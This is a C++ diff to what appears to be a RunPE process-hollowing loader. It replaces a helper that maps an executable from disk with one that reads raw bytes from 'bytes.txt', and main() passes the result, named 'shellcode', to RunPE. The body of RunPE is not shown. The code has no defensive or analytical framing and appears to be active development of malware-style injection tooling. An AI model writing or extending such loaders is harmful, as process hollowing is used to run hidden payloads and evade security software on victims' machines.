@@ -5,23 +5,69 @@
 #include <TlHelp32.h>
 #include <filesystem>
 #include <thread>
+#include <cstring>
+#include <vector>
 
-LPVOID MapFileToMemory(LPCSTR path) {
-    if (!std::filesystem::exists(path))
+// LPVOID MapFileToMemory(LPCSTR path) {
+//     if (!std::filesystem::exists(path))
+//         return nullptr;
+
+//     std::streampos size;
+//     std::ifstream file(path, std::ios::in | std::ios::binary | std::ios::ate);
+//     if (file.is_open()) {
+//         size = file.tellg();
+//         char* mem = new char[size]();
+//         file.seekg(0, std::ios::beg);
+//         file.read(mem, size);
+//         file.close();
+//         return mem;
+//     }
+//     return nullptr;
+// }
+
+
+
+LPVOID MapBytesFromFileToMemory(const char* path) {
+    // Open the file in binary mode to read raw bytes
+    std::ifstream file(path, std::ios::in | std::ios::binary);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file: " << path << std::endl;
         return nullptr;
-
-    std::streampos size;
-    std::ifstream file(path, std::ios::in | std::ios::binary | std::ios::ate);
-    if (file.is_open()) {
-        size = file.tellg();
-        char* mem = new char[size]();
-        file.seekg(0, std::ios::beg);
-        file.read(mem, size);
-        file.close();
-        return mem;
     }
-    return nullptr;
+
+    // Read the contents of the file into a vector
+    std::vector<char> bytes((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    // Check if the vector is empty
+    if (bytes.empty()) {
+        std::cerr << "File is empty or read failed." << std::endl;
+        return nullptr;
+    }
+
+    // Allocate memory for the raw bytes
+    char* mem = new char[bytes.size()]();
+    std::copy(bytes.begin(), bytes.end(), mem); // Copy the raw bytes to mem
+
+    return mem; // Return the pointer to memory
 }
+
+
+// LPVOID MapBytesToMemory(const char* bytes, size_t size) {
+//     if (bytes == nullptr || size == 0)
+//         return nullptr;
+
+//     // Allocate memory for the given bytes
+//     char* mem = new char[size]();
+    
+//     // Copy the bytes to allocated memory
+//     std::memcpy(mem, bytes, size);
+    
+//     // Return the pointer to the memory
+//     return mem;
+// }
+
+
 
 int RunPE(LPPROCESS_INFORMATION processinfo, LPSTARTUPINFOW startinfo, LPVOID image, LPWSTR args) {
     WCHAR filepath[MAX_PATH];
@@ -98,7 +144,11 @@ int main() {
     ZeroMemory(&startupinfo, sizeof(startupinfo));
     startupinfo.cb = sizeof(STARTUPINFOW); // Set the size for the STARTUPINFO structure
     WCHAR args[] = L"";
-    LPVOID shellcode = MapFileToMemory("C:\\Users\\LibraryUser\\Downloads\\64bit.exe");
+    // LPVOID shellcode = MapFileToMemory("C:\\Users\\LibraryUser\\Desktop\\sensorweb\\executables\\main.exe");
+    // // LPVOID shellcode = MapBytesToMemory
+
+    const char* path = "bytes.txt";
+    LPVOID shellcode = MapBytesFromFileToMemory(path);
     if (shellcode == nullptr) {
         std::cout << "Failed To Map File To Memory" << std::endl;
         return 1; // Return an integer value
